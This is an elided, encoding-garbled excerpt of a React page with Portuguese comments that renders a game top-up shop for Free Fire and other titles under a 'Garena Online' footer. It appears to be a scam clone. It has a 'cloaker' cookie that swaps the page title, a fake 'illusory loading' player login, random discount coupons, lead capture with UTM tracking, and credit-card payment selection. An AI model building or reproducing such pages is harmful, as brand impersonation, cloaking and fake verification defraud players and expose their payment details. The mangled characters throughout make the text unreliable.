...
export default function HomePage() {
  ...
  // ForÃƒÂ§ar light mode removendo classe dark
  useEffect(() => {
  ...
  // Mudar tÃƒÂ­tulo se tiver cookie do cloaker
  useEffect(() => {
  ...
  const [showBlurOverlay, setShowBlurOverlay] = useState(false) // Modal desabilitado no inÃƒÂ­cio
  ...
  // FunÃƒÂ§ÃƒÂ£o para navegar preservando UTM params
  ...
  // FunÃƒÂ§ÃƒÂ£o para adicionar UTMs a qualquer URL interna
  const addUtmsToUrl = (url: string): string => {
    ...
    // Adicionar todos os parÃƒÂ¢metros atuais ÃƒÂ  nova URL
  ...
  // ConfiguraÃƒÂ§ÃƒÂµes dinÃƒÂ¢micas por jogo
  const gameConfig = {
    freefire: {
      name: 'Free Fire',
  ...
  // Evitar problemas de hidrataÃƒÂ§ÃƒÂ£o
  useEffect(() => {
    setMounted(true)
  }, [])

  // Detectar se ÃƒÂ© desktop
  useEffect(() => {
  ...
  // Verificar se usuÃƒÂ¡rio jÃƒÂ¡ estÃƒÂ¡ logado
  useEffect(() => {
    if (typeof window === 'undefined') return
    ...
    // Listener para mudanÃƒÂ§as na URL (quando trocar de jogo)
  ...
  useEffect(() => {
    ...
    // Escutar mudanÃƒÂ§as de rota do Next.js
    ...
    // Interceptar pushState e replaceState para detectar mudanÃƒÂ§as de rota
  ...
  // FunÃƒÂ§ÃƒÂ£o para aceitar cookies
  ...
  // Capturar e salvar parÃƒÂ¢metros UTM no sessionStorage
  useEffect(() => {
    if (typeof window === 'undefined') return
    ...
    // Salvar parÃƒÂ¢metros da URL no sessionStorage
  ...
  // RotaÃƒÂ§ÃƒÂ£o automÃƒÂ¡tica dos banners
  useEffect(() => {
  ...
  // FunÃƒÂ§ÃƒÂ£o para gerar cupom de desconto
  const generateCoupon = () => {
    const randomDigits = Math.floor(10000000 + Math.random() * 90000000) // 8 dÃƒÂ­gitos
    return `FF${randomDigits}`
  }

  // FunÃƒÂ§ÃƒÂ£o para copiar texto (compatÃƒÂ­vel com mobile)
  const copyToClipboard = async (text: string) => {
    try {
      ...
      // Fallback para dispositivos mÃƒÂ³veis/contextos nÃƒÂ£o seguros
      ...
      // Como ÃƒÂºltimo recurso, mostrar um prompt para o usuÃƒÂ¡rio copiar manualmente
      const userAgent = navigator.userAgent.toLowerCase()
      const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/.test(userAgent)
      
      if (isMobile) {
        alert(`Copie este cÃƒÂ³digo manualmente: ${text}`)
        setCouponCopied(true)
      }
    }
  }
  ...
  const bannerImages = [
    ...
    "/images/checkout-banner.webp"  // VocÃƒÂª pode substituir por outras imagens
  ]
  ...
  const calculatePrice = (diamonds: string): { price: number; bonus: number } => {
    ...
    // PreÃƒÂ§os especÃƒÂ­ficos por jogo
  ...
  // FunÃƒÂ§ÃƒÂ£o para buscar informaÃƒÂ§ÃƒÂµes do avatar
  ...
  const handleLogin = async (e: React.FormEvent) => {
    ...
    if (!playerId.trim()) {
      setLoginError("Por favor, insira um ID de jogador vÃƒÂ¡lido.")
      return
    }
    ...
    // Login simplificado para Delta Force e Haikyu com loading ilusÃƒÂ³rio
    ...
    try {
      ...
      setIsLoggedIn(false)
      setLoginError("Erro de conexÃƒÂ£o. Verifique sua internet e tente novamente.")
    } finally {
      setIsLoading(false)
    }
  }
  ...
  // FunÃƒÂ§ÃƒÂ£o para salvar lead do usuÃƒÂ¡rio
  const saveUserLead = (reason: string) => {
    ...
    // Marcar que o usuÃƒÂ¡rio jÃƒÂ¡ passou pelo processo
  ...
  // Nova funÃƒÂ§ÃƒÂ£o para lidar com step 3
  // FunÃƒÂ§ÃƒÂ£o para reiniciar (simplificada)
  ...
  // FunÃƒÂ§ÃƒÂ£o para lidar com login social
  ...
  const handleValueSelect = (value: string) => {
    ...
    // Ir direto para a pÃƒÂ¡gina de recarga
  ...
  const handleBuyNow = () => {
    ...
    if (selectedRechargeValue) {
      ...
      // Adicionar parÃƒÂ¢metros UTM individualmente
    ...
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl max-w-sm w-full mx-4 relative border-4 border-red-500">
          ...
          <div className="p-4">
            <div className="bg-gradient-to-br from-red-50 to-red-100 rounded-xl p-6 mb-4 border-2 border-red-200">
              <div className="text-center mb-4">
                ...
                <h2 className="text-xl font-bold text-red-600 mb-2">ParabÃƒÂ©ns! Ã°Å¸Å½â€°</h2>
                <p className="text-sm text-gray-700 leading-relaxed mb-4">
                  VocÃƒÂª ganhou um <span className="font-bold text-red-600">cupom de 5% de desconto</span> para usar na sua recarga!
                </p>
                ...
                <p className="text-xs text-gray-600 leading-relaxed mb-4">
                  Cole este cÃƒÂ³digo no checkout para ganhar 5% de desconto adicional na sua recarga!
                </p>
              </div>
          ...
          {/* Footer */}
          <div className="pb-4">
            <p className="text-center text-sm text-gray-500">Ã‚Â© Garena Online. Todos os direitos reservados.</p>
          </div>
        </div>
      </div>
    )
  ...
  // Evitar problemas de hidrataÃƒÂ§ÃƒÂ£o - nÃƒÂ£o renderizar atÃƒÂ© estar montado
  if (!mounted) {
    return null
  }
  ...
  <g>
    ...
    <path fillRule="evenodd" clipRule="evenodd" d="M25.6921 32.7649C25.7443 31.7155 26.4869 31.2646 27.517 31.2646C28.3116 31.2646 29.1761 31.5074 29.1761 32.7043V35.0805C29.1761 35.2894 29.2808 35.41 29.4989 35.41C29.5602 35.41 29.6303 35.3928 29.6738 35.3753V35.8348C29.5513 35.861 29.464 35.8693 29.3155 35.8693C28.757 35.8693 28.67 35.5572 28.67 35.0892H28.6525C28.2677 35.6702 27.8749 36.0001 27.0102 36.0001C26.1811 36.0001 25.5 35.5923 25.5 34.69C25.5 33.5196 26.5669 33.4011 27.6719 33.2784C27.7538 33.2693 27.8362 33.2602 27.9181 33.2506C28.3729 33.1986 28.6263 33.1377 28.6263 32.6431C28.6263 31.9067 28.0933 31.7244 27.4471 31.7244C26.766 31.7244 26.2597 32.0364 26.2421 32.7649H25.6921ZM28.6261 33.424H28.6084C28.5391 33.5541 28.2944 33.5973 28.146 33.6233C27.9929 33.6503 27.8336 33.6727 27.6744 33.695C26.8619 33.809 26.0498 33.923 26.0498 34.6558C26.0498 35.202 26.5387 35.5399 27.0539 35.5399C27.8924 35.5399 28.6345 35.0112 28.6261 34.1351V33.424Z" fill="#E41E26"/>
        ...
        {/* ConteÃƒÂºdo Principal com padding para header e footer */}
        ...
        <div className="md:bg-[#151515]">
          ...
          <div className="group mx-auto w-full md:max-w-[1366px] md:px-8 lg:px-10">
            ...
            {/* Desktop: MÃƒÂºltiplas imagens visÃƒÂ­veis */}
            <div className="relative hidden md:flex justify-center" style={{ paddingTop: '23%' }}>
              ...
              {/* BotÃƒÂµes de navegaÃƒÂ§ÃƒÂ£o - Desktop */}
        ...
        <div className="bg-[#EFEFEF] dark:bg-[#333356]">
          <div className="relative w-full">
            ...
            {/* ConteÃºdo da SeleÃ§Ã£o de Jogos */}
        ...
        {/* Eventos especiais Section - Apdsas Ssee Fire */}
...
{!isLoggedIn && (
          ...
          <div className="grid grid-cols-3 gap-2 sm:gap-2.5 sm:grid-cols-4 md:grid-cols-6 md:gap-4">
            {currentConfig.rechargeValues.map((value) => {
              ...
              return (
                ...
                >
                  {/* Badge de PromoÃƒÂ§ÃƒÂ£o - Coins em Dobro para Delta Force */}
                  {hasDoubleCoins && (
        ...
        {/* Modal de InformaÃƒÂ§ÃƒÂ£o da Oferta - Haikyu */}
        ...
        {/* MÃƒÂ©todo de pagamento Section */}
        <div className="relative mx-auto max-w-5xl px-4 sm:px-[22px] md:px-8 pb-4 sm:pb-6">
          ...
          <div role="radiogroup" className="grid grid-cols-2 gap-2 sm:gap-2.5 md:grid-cols-3 md:gap-4">
            ...
            <div
              role="radio"
              aria-checked={selectedPaymentMethod === "CartÃƒÂ£o de CrÃƒÂ©dito"}
              tabIndex={0}
              onClick={() => setSelectedPaymentMethod("CartÃƒÂ£o de CrÃƒÂ©dito")}
              className={`group relative flex h-full min-h-[70px] sm:min-h-[80px] cursor-pointer items-start gap-1.5 sm:gap-2 rounded-md p-2 sm:p-2.5 transition-all focus-visible:ring-2 focus-visible:ring-ring max-md:flex-col max-md:justify-between md:items-center md:gap-3 md:p-3 ${
                selectedPaymentMethod === "CartÃƒÂ£o de CrÃƒÂ©dito" 
                  ? "border-2 border-red-500 bg-red-50" 
                  : "border border-gray-200 bg-white hover:border-red-300"
              }`}
            >
                  ...
                  {selectedGame === 'haikyu' && (
                    <div>
                      ...
                      <ol className="list-decimal list-inside space-y-2 text-sm text-gray-700">
                        ...
                        <li>Ao lado da sua foto vocÃƒÂª verÃƒÂ¡ o <strong>ID</strong></li>
        ...
        {/* Modal de Login Social IndisponÃ­vel */}
        {showSocialError && (
